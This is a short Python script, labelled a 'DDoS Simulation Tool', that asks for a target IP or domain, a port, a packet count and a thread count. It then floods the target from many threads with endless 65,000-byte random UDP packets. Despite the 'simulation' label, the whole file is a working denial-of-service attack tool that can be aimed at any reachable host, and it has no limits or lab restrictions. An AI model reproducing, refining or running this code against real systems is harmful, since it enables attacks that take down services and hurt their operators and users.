import os
import random
import sys
import socket
import threading
import ipaddress

os.system('clear' if os.name == 'posix' else 'cls')

def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def run(ip_run, port_run, times_run):
    data_run = random._urandom(65000)  # Increased packet size
    try:
        while True:
            print(f"\033[1;31m[*]\033[0m \033[1mSending UDP packets to {ip_run}:{port_run}!\033[0m")
            s_run = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr_run = (str(ip_run), int(port_run))

            for x_run in range(times_run):
                s_run.sendto(data_run, addr_run)
            s_run.close()

    except KeyboardInterrupt:
        print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
        sys.exit(0)

    except Exception as e:
        sys.exit(f"\033[1;31m[!]\033[0m \033[1;37m{e}\033[0m")

def main():
    print("\n\033[1;31mDDoS Simulation Tool\033[0m")
    while True:
        try:
            target = input("\033[1;31m[#]\033[0m Enter target IP or domain: ")
            if target.strip() and (is_valid_ipv4(target) or not target.replace('.', '').isdigit()):
                break
            else:
                print("\033[1;31m[!]\033[0m Invalid input. Please enter a valid target IP or domain.")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m Script terminated by user (Ctrl+C). Exiting.")
            sys.exit(0)
            
    ip = socket.gethostbyname(target) if not is_valid_ipv4(target) else target
    print(f"\033[1;31m[+]\033[0m Resolved {target} to {ip}")

    port = int(input("\033[1;31m[#]\033[0m Enter target port: "))

    times = int(input("\033[1;31m[#]\033[0m Enter packets per connection: "))
    
    threads = int(input("\033[1;31m[#]\033[0m Enter number of threads: "))

    for y in range(threads):
        th = threading.Thread(target=run, args=(ip, port, times))
        th.start()

if __name__ == "__main__":
    main()
